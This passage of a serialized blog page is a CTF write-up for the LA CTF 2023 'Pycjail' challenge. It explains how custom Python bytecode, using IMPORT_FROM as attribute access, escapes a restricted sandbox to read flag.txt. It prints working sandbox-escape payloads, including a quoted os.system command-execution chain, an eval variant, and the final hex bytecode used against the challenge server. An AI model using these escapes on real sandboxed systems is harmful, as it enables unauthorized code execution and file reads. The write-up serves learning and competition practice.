           \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),\" CALL_FUNCTION            \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"6\"}),\" LOAD_METHOD              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\" CALL_METHOD              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"             \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),` RETURN_VALUE\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"To test various payloads with the provided \",(0,e.jsx)(n.code,{children:\"main.py\"}),\" script, I created this small script to give me the info I want:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"language-python3 code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`import dis\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code_str = 'print(\"a\")'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code = compile(code_str, '<string>', 'exec')\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`dis.dis(code)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`print(\"\\\\nconsts: \", code.co_consts)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`print(\"names: \", code.co_names)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`print(\"code: \", code.co_code.hex())\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Based on the provided \",(0,e.jsx)(n.code,{children:\"code_str\"}),\", it would show me a disassembly of the code, along with \",(0,e.jsx)(n.code,{children:\"co_consts\"}),\", \",(0,e.jsx)(n.code,{children:\"co_names\"}),\", and \",(0,e.jsx)(n.code,{children:\"co_code\"}),\" in the form desired.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Now that I was set up to try stuff, I went through the Python bytecode documentation, opcode by opcode, trying to see if there was anything that would put a callable on the stack. Many of the opcodes were eliminated from the start, such as \",(0,e.jsx)(n.code,{children:\"BINARY_*\"}),\", \",(0,e.jsx)(n.code,{children:\"UNARY_*\"}),\", \",(0,e.jsx)(n.code,{children:\"INPLACE_*\"}),\", \",(0,e.jsx)(n.code,{children:\"POP_*\"}),\", \",(0,e.jsx)(n.code,{children:\"ROT_*\"}),\", and \",(0,e.jsx)(n.code,{children:\"DUP_*\"}),\". \",(0,e.jsx)(n.code,{children:\"CALL_*\"}),\" were going to be useful later on, but wouldn\\u2019t help us get a callable onto the stack. After spending about an hour with a teammate looking through the opcodes, we felt like there wasn\\u2019t anything there. So we did what anyone would do and asked ChatGPT (no, it wasn\\u2019t helpful).\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"https://raw.githubusercontent.com/Legoclones/website/main/source/static/lactf-pycjail/chatgpt.png\",alt:\"ChatGPT For the Rescue?\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"turning-point\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#turning-point\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Turning Point\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Desperate, we did some more research online with CTF writeups until I came across \",(0,e.jsx)(n.a,{href:\"https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak\",children:\"a write-up by kmh from DiceCTF 2021\"}),\". The challenge \",(0,e.jsx)(n.code,{children:\"TI-1337 Plus CE\"}),' was also a pyjail, and one of the things I learned was that \"',(0,e.jsx)(n.code,{children:\"IMPORT_FROM\"}),\" is \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),' in disguise!\".']}),`\n`,(0,e.jsxs)(n.p,{children:[\"The opcode \",(0,e.jsx)(n.code,{children:\"IMPORT_FROM\"}),\" was \",(0,e.jsx)(n.strong,{children:\"not banned\"}),\", but we hadn\\u2019t paid much attention to it because it always follows (and only functions properly with) the opcode \",(0,e.jsx)(n.code,{children:\"IMPORT_NAME\"}),\", which was banned. However, if we could use it to function as \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),\", then that means we could get a callable onto the stack, and through attribute stacking run some code like \",(0,e.jsx)(n.code,{children:'\"\".__class__.__base__.__subclasses__()[144]()._module.__builtins__[\"eval\"](\"insert code here\")'}),\".\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"It was also apparent that since using \",(0,e.jsx)(n.code,{children:\"IMPORT_FROM\"}),\" in place of \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),\" isn\\u2019t any default behavior for the Python interpreter, we would have to manually create custom bytecode to be successful. This actually made sense; normally, pyjails just ask for a line of code (single \",(0,e.jsx)(n.code,{children:\"input()\"}),\" call), but this one had you specify certain parts of the \",(0,e.jsx)(n.code,{children:\"code\"}),\" object you wanted to create. However, understanding the Python bytecode wouldn\\u2019t be \",(0,e.jsx)(n.em,{children:\"typical\"}),\" or even perhaps \",(0,e.jsx)(n.strong,{children:\"technically compliant\"}),\" explained the challenge author\\u2019s design choice.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Manual testing confirmed our suspicion that \",(0,e.jsx)(n.code,{children:\"IMPORT_FROM\"}),\" worked as desired, so it was now time to create a payload.\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"developing-a-payload-with-restrictions\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#developing-a-payload-with-restrictions\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Developing a Payload With Restrictions\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"A lot of testing and trial & error was performed at this point to get a payload that would work. Getting the payload \",(0,e.jsx)(n.code,{children:'\"\".__class__.__base__.__subclasses__'}),\" to work was fairly simple, however we ran into errors doing \",(0,e.jsx)(n.code,{children:'\"\".__class__.__base__.__subclasses__()'}),\".\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`$ python3 main.py\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"consts: \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d025300\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"here goes\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"built-in method __subclasses__ of \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"type\"}),\" object at 0x55bf92bc364\",(0,e.jsxs)(n.span,{className:\"token operator\",children:[(0,e.jsx)(n.span,{className:\"token file-descriptor important\",children:\"0\"}),\">\"]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`$ python3 main.py\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"consts: \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d02a1005300\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"here goes\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Traceback \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"most recent call last\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  File \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/home/justin/tmp/lactf/main.py\"'}),\", line \",(0,e.jsx)(n.span,{className:\"token number\",children:\"51\"}),\", \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"module\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"))\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  File \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/home/justin/tmp/lactf/main.py\"'}),\", line -1, \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` f\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"TypeError: object\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),` takes no arguments\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"The opcode used above was \",(0,e.jsx)(n.code,{children:\"CALL_METHOD\"}),\", so I tried \",(0,e.jsx)(n.code,{children:\"CALL_FUNCTION\"}),\" and it works! Apparently the two ways for calling functions is by pairing \",(0,e.jsx)(n.code,{children:\"LOAD_METHOD\"}),\" and \",(0,e.jsx)(n.code,{children:\"CALL_METHOD\"}),\", or \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),\" and \",(0,e.jsx)(n.code,{children:\"CALL_FUNCTION\"}),\".\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The next issue we ran into was getting a number on the stack. Because \",(0,e.jsx)(n.code,{children:\"main.py\"}),\" used the \",(0,e.jsx)(n.code,{children:\"input()\"}),\" function to get the data, everything was treated as a string. Inserting \",(0,e.jsx)(n.code,{children:\"1\"}),\" as a const would always have it render as \",(0,e.jsx)(n.code,{children:\"'1'\"}),\". After some research, we settled on the \",(0,e.jsx)(n.code,{children:\"GET_LEN\"}),\" opcode, which just ran the \",(0,e.jsx)(n.code,{children:\"len()\"}),\" function on the item on top of the stack. Since our first constant was just an empty string, and the actual value of the string didn\\u2019t matter (aka \",(0,e.jsx)(n.code,{children:'\"\".__class__'}),\" and \",(0,e.jsx)(n.code,{children:'\"abcd\".__class__'}),\" are the same), we could load that const onto the stack again and run \",(0,e.jsx)(n.code,{children:\"GET_LEN\"}),\" to put the length of that string onto the stack. We could just set the length of the initial string to whatever we want to obtain the desired integer.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"However, a second hiccup was encountered that required 2 additional opcodes to bypass. \",(0,e.jsx)(n.code,{children:\"GET_LEN\"}),\" pushed the integer we wanted onto the stack, but kept the loaded string on there too, which we didn\\u2019t want. I had to insert an extra \",(0,e.jsx)(n.code,{children:\"ROT_TWO\"}),\" and \",(0,e.jsx)(n.code,{children:\"POP_TOP\"}),\" opcode to switch the order and remove the string from the opcode.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"At this point, the payload we had was:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`Python code: 'aaaa...aaa'.__class__.__base__.__subclasses__()[14]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`consts: aaaa...aaa\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d02830064001e000200010019005300\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Disassembly:\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6400 -> LOAD_CONST, consts[0] -> 'aaaa...aaa'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d00 -> IMPORT_FROM, names[0] -> __class__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d01 -> IMPORT_FROM, names[1] -> __base__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d02 -> IMPORT_FROM, names[2] -> __subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`8300 -> CALL_FUNCTION\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6400 -> LOAD_CONST, consts[0] -> 'aaaa...aaa'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`1e00 -> GET_LEN -> 14 or whatever we want\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0200 -> ROT_TWO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0100 -> POP_TOP\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`1900 -> BINARY_SUBSCR\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`5300 -> RETURN_VALUE\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We had \",(0,e.jsx)(n.strong,{children:\"2 consts, 1 name, and 4 opcodes\"}),\" left to get what we wanted, but we had access to \",(0,e.jsx)(n.a,{href:\"https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/classes.txt\",children:\"an extensive list of classes\"}),\" that opened up functionality a lot.\"]}),`\n`,(0,e.jsxs)(n.p,{children:['The \"stereotypical\" payload ',(0,e.jsx)(n.a,{href:\"https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins\",children:\"from HackTricks\"}),\" is to use \",(0,e.jsx)(n.code,{children:\"''.__class__.__bases__.__subclasses__()[144]()._module.__builtins__['__import__']('os').system('ls')\"}),\" to run system commands (note that this was slightly modified from the Python2 version, and the exact index of \",(0,e.jsx)(n.code,{children:\"<class 'warnings.catch_warnings'>\"}),\" may vary depending on your installation & version). The problem with this payload was it required another 3 names (\",(0,e.jsx)(n.code,{children:\"_module\"}),\", \",(0,e.jsx)(n.code,{children:\"__builtins__\"}),\", \",(0,e.jsx)(n.code,{children:\"system\"}),\") and 3 consts (\",(0,e.jsx)(n.code,{children:\"'__import__'\"}),\", \",(0,e.jsx)(n.code,{children:\"'os'\"}),\", \",(0,e.jsx)(n.code,{children:\"'ls'\"}),\"), which we didn\\u2019t have. We considered making our first const of length 144 the same as our last const (padding our bash payload with extra \",(0,e.jsx)(n.code,{children:\";\"}),\"s until we reached our desired length), but we still had 2 extra names.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Our second thought was \",(0,e.jsx)(n.code,{children:'\"\".__class__.__base__.__subclasses__()[144]()._module.__builtins__[\"eval\"](\"insert code here\")'}),\", but that required 2 names and 2 consts (still 1 too many names).\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"After perusing the list of available classes one by one, I started looking into the class at index 118, which was \",(0,e.jsx)(n.code,{children:\"<class '_frozen_importlib_external.FileLoader'>\"}),\". Looking at this class\\u2019s attributes, I saw the function \",(0,e.jsx)(n.code,{children:\"get_data()\"}),\", which required two arguments for the path of a file. Excited, I wrote up and tested the code \",(0,e.jsx)(n.code,{children:`(\"a\"*118).__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')`}),\", and my local flag was printed! This only required 1 extra name and const (we even had one const leftover), and used exactly 4 more opcodes.\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"final-payload\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#final-payload\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Final Payload\"]}),`\n`,(0,e.jsx)(n.p,{children:\"The final payload was:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`''.__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`consts: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,flag.txt\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__,get_data\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d02830064001e000200010019006d036401640183025300\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6400 -> LOAD_CONST, consts[0] -> 'a'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d00 -> IMPORT_FROM, names[0] -> __class__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d01 -> IMPORT_FROM, names[1] -> __base__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d02 -> IMPORT_FROM, names[2] -> __subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`8300 -> CALL_FUNCTION\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6400 -> LOAD_CONST, consts[0] -> 'a'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`1e00 -> GET_LEN -> 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0200 -> ROT_TWO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0100 -> POP_TOP\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`1900 -> BINARY_SUBSCR\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d03 -> IMPORT_FROM, names[3] -> get_data\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6401 -> LOAD_CONST, consts[1] -> 'flag.txt'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6401 -> LOAD_CONST, consts[1] -> 'flag.txt'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`8302 -> CALL_FUNCTION\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`5300 -> RETURN_VALUE\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And server interaction:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"~/tmp/lactf $ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" lac.tf \",(0,e.jsx)(n.span,{className:\"token number\",children:\"31130\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`consts: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,flag.txt\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__,get_data\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d02830064001e000200010019006d036401640183025300\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"here goes\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"b\",(0,e.jsx)(n.span,{className:\"token string\",children:\"'flag{maybe i should_only_allow_nops_next_time}\\\\n'\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.strong,{children:\"Flag:\"}),\" \",(0,e.jsx)(n.code,{children:\"flag{maybe_i_should_only_allow_nops_next_time}\"})]})]})}}var y=b;return w;})();\n;return Component;","toc":[{"value":"Pycjail (Misc, 495 Points)","url":"#pycjail-misc-495-points","depth":2},{"value":"Approaching the Problem","url":"#approaching-the-problem","depth":3},{"value":"Turning Point","url":"#turning-point","depth":3},{"value":"Developing a Payload With Restrictions","url":"#developing-a-payload-with-restrictions","depth":3},{"value":"Final Payload","url":"#final-payload","depth":3}],"frontMatter":{"readingTime":{"text":"11 min read","minutes":10.035,"time":602100,"words":2007},"slug":"lactf-2023/pycjail","fileName":"lactf-2023/pycjail.md","title":"LA CTF 2023 – Pycjail","date":"2023-02-12T00:00:00.000Z","draft":false,"authors":["legoclones"],"tags":["LACTF 2023","Misc","Python","Pyjail","Sandbox","Opcode"],"summary":"Use bytecode manipulation to subvert jail restrictions.","canonical":"https://justinapplegate.me/2023/lactf-pycjail"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.26,"time":15600,"words":52},"slug":["legoclones"],"fileName":"legoclones.md","name":"Legoclones","avatar":"https://www.gravatar.com/avatar/a6122f35bdc157fb5e76ef5f3de833a2?d=identicon&s=256","specialties":["Reverse","Web"],"twitter":"https://twitter.com/legoclones","github":"https://github.com/Legoclones","web":"https://justinapplegate.me","member":true,"description":"Just a simple man trying to make my way in the universe","order":16,"date":null}],"prev":{"title":"LA CTF 2023 – Snek","date":"2023-02-12T00:00:00.000Z","draft":false,"authors":["legoclones"],"tags":["LACTF 2023","Reverse","Python","Pickle"],"summary":"Reverse engineer pickle and code objects to determine winning moves.","canonical":"https://justinapplegate.me/2023/lactf-snek","slug":"lactf-2023/snek"},"next":{"title":"UT CTF 2023 – Zipper","date":"2023-03-12T00:00:00.000Z","draft":false,"authors":["legoclones"],"tags":["UTCTF 2023","Misc","Zip"],"summary":"Craft a malicious Zip file with identically-named files to bypass a filter and get RCE.","canonical":"https://justinapplegate.me/2023/utctf-zipper/","slug":"utctf-2023/zipper"}},"__N_SSG":true}